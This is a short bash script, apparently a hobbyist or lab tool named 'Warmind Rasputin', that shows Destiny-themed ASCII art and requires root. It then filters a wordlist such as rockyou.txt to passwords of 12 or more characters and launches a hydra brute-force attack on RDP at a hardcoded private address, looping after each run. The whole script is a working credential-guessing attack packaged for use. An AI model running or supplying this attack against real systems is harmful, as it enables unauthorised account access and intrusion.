#!/bin/bash

#Title: Warmind Rasputin
#Author: Gh0st-D3V
#Creation Date: 2/21/23
#Version: 0.2 Dev

if [ "$EUID" -ne 0 ]; then 
        echo "Warmind Access is limited to root users only"
        exit
fi

clear
echo "           @@@@@@@@@@@@@@@@@@@@@@@@@@# @.@ @@@@@@@@@@@@@@@@@@@@@@@@@@#"
echo "             ,@@@@@@@@@@@@@@@@@@@@@ @@@@.@@@./@@@@@@@@@@@@@@@@@@@@@"
echo "                @@@@@@@@@@@@@@@@# @@@@@@.@@@@@@ @@@@@@@@@@@@@@@@#"
echo "                  *@@@@@@@@@@@ %@@@@@@#.  @@@@@@@,(@@@@@@@@@@@"
echo "                             @@@@@@@ %@@.@@ (@@@@@@@"
echo "                          %@@@@@@#.@@@@@.@@@@% @@@@@@@,"
echo "                        @@@@@@@ &@@@@@@* &@@@@@@ (@@@@@@@"
echo "                     &@@@@@@#.@@@@@@@      ,@@@@@@% @@@@@@@."
echo "                   *@@@@@@@ @@@@@@@          %@@@@@@*.@@@@@@@."
echo "                      @@@@@@@**@@@@@@&     @@@@@@@ @@@@@@@("
echo "                        *@@@@@@@ @@@@@@@.@@@@@@*,@@@@@@@"
echo "                           @@@@@@@**@@@@.@@@@ @@@@@@@("
echo "                             /@@@@@@@ @@.@*,@@@@@@@"
echo "                                @@@@@@@/ @@@@@@@("
echo "                                  *@@@@@.@@@@@"
echo "                                     @@@.@@("
echo "                                       *.   "
echo " Rasputin Online!"
echo -n "Do you want to initiate warsats? (yes/no): "; read Console
if [ "$Console" = "yes" ]; then 
       echo  -n "Enter path/to/wordlist (/usr/share/wordlists/rockyou.txt): "; read path
	cat "$path" | grep -E '^.{12,}' > passlist.txt
        echo -n "Enter possible user credentials: "; read users
        sudo hydra -I -l "$users" -P passlist.txt -t 1 -F -V rdp://172.16.139.39 
        exec "$0"
elif [ "$Console" = "no" ]; then
        echo "Goodbye"
        sleep 3
	clear
        exit
else
        echo "Invalid selection"
        exec "$0"
fi
